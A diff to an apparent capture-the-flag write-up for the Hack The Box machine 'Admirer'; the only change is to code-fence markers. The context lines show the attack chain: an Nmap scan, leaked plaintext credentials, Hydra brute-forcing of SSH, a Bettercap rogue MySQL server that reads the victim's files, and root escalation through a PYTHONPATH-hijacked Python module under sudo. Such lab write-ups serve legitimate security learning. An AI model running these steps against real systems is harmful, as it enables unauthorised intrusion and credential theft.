@@ -23,7 +23,7 @@ of their success.
 
 Let's start with an Nmap scan:
 
-```raw
+```
 $ nmap -A 10.10.10.187
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-17 09:39 EDT
 Nmap scan report for 10.10.10.187
@@ -72,7 +72,7 @@ was referring to: `/admin-dir/contacts.txt` and `/admin-dir/credentials.txt`.
 The first one contains a list of email addresses with the first name and role of
 the persons as comments:
 
-```raw
+```
 ##########
 # admins #
 ##########
@@ -106,7 +106,7 @@ Email: b.rauch@admirer.htb
 
 And the second one some credentials for different services:
 
-```raw
+```
 [Internal mail account]
 w.cooper@admirer.htb
 fgJr6q#S\W:$P
@@ -128,7 +128,7 @@ With the FTP credentials, I could download these 2 files from vsftpd:
 The SQL backup doesn't contain anything interesting but `html.tar.gz` reveals
 the website structure:
 
-```raw
+```
 $ tree html
 html
 ├── assets
@@ -256,7 +256,7 @@ $password = "Wh3r3_1s_w4ld0?";
 And in `w4ld0s_s3cr3t_d1r/credentials.txt` (the same file on the live website
 doesn't contain the bank account):
 
-```raw
+```
 [Bank Account]
 waldo.11
 Ezy]m27}OREc$
@@ -277,7 +277,7 @@ w0rdpr3ss01!
 With all these credentials, I made two wordlists. One with the different
 usernames:
 
-```raw
+```
 waldo
 waldo.11
 admin
@@ -300,7 +300,7 @@ b.rauch
 
 And another one with the different passwords:
 
-```raw
+```
 Wh3r3_1s_w4ld0?
 ]F7jLHw:*G>UPrTo}~A
 ]F7jLHw:*G>UPrTo}~A"d6b
@@ -312,7 +312,7 @@ w0rdpr3ss01!
 
 Then, I tried to brute-force the SSH service with [Hydra][kali-hydra]:
 
-```raw
+```
 $ hydra -L usernames.txt -P passwords.txt -t 4 10.10.10.187 ssh
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
@@ -358,7 +358,7 @@ server][bettercap-mysql-module] to read files from the victim using the
 technique previously mentioned. To do so, I created a [caplet
 script][bettercap-caplets] with the following content:
 
-```raw
+```
 # Replace with your HTB VPN IP address.
 set mysql.server.address 10.10.14.17
 set mysql.server.port 3306
@@ -369,7 +369,7 @@ mysql.server on
 
 And to start Bettercap:
 
-```raw
+```
 # bettercap -caplet adminer-mysql.cap
 ```
 
@@ -377,7 +377,7 @@ Before going further, make sure to accept incoming connections from the remote
 server. If you are on a Linux-based system like myself, add this Netfilter rule
 with `iptables`:
 
-```raw
+```
 # iptables -I INPUT 1 -s 10.10.10.187 -j ACCEPT
 ```
 
@@ -394,7 +394,7 @@ $password = "&<h5b~yK3F#{PaPB&dA}{H>";
 
 And these credentials are the ones of an actual UNIX account!
 
-```raw
+```
 $ ssh waldo@10.10.10.187
 waldo@10.10.10.187's password:
 Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux
@@ -418,7 +418,7 @@ waldo@admirer:~$ cat user.txt
 After a bit of enumeration, I quickly realised that `waldo` had the permission
 to run `/opt/scripts/admin_tasks.sh` on behalf of `root`:
 
-```raw
+```
 $ sudo -l
 [sudo] password for waldo:
 Matching Defaults entries for waldo on admirer:
@@ -431,7 +431,7 @@ User waldo may run the following commands on admirer:
 When running this shell script, the user is prompted to select an admin task to
 execute:
 
-```raw
+```
 $ sudo /opt/scripts/admin_tasks.sh
 
 [[[ System Administration Menu ]]]
@@ -499,7 +499,7 @@ def make_archive(x, y, z):
 
 I placed this Python script in `/tmp/shutil/__init__.py` and then:
 
-```raw
+```
 $ sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh 6
 Running backup script in the background, it might take a while...
 $ 86875a82845fa2c5f211500a85d78f5c
